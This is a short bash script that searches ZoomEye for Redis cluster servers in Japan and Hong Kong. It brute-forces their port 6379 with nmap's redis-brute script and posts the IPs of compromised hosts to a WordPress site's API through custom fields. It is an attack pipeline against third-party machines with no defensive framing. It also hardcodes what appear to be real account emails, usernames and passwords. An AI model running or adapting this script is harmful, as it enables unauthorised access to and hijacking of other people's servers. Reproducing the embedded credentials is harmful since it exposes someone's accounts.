#!/usr/bin/env bash

python zoomeye.py -l 50 --user 867653608@qq.com --password wy16880175 "cluster +app:Redis +country:Japan" > iplist.txt
results_japan=$(nmap -Pn -sT -p 6379 -iL iplist.txt --script=redis-brute.nse | grep -oE "ip: \b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b")
readarray -t ips <<< ${results_japan}
token=$(curl --header "Content-Type: application/json" --request POST --data '{"username":"wooyme","password":"wy16880175"}' http://zzyun.co/wp-json/jwt-auth/v1/token | jq -r '.token')
curl --header "Content-Type: application/json" --header "Authorization: Bearer $token" --request PUT --data "{\"fields\":{\"center\":\"${ips[0]}\"}}" http://www.zzyun.co/wp-json/acf/v3/posts/3076/center
python zoomeye.py -l 200 --user 867653608@qq.com --password wy16880175 "cluster +app:Redis +subdivisions:香港" > iplist.txt
results_hk=$(nmap -Pn -sT -p 6379 -iL iplist.txt --script=redis-brute.nse | grep -oE "ip: \b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b")
readarray -t ips1 <<< ${results_hk}
curl --header "Content-Type: application/json" --header "Authorization: Bearer $token" --request PUT --data "{\"fields\":{\"node\":\"${ips1[0]}/${ips1[1]}/${ips1[2]}\"}}" http://www.zzyun.co/wp-json/acf/v3/posts/3076/center
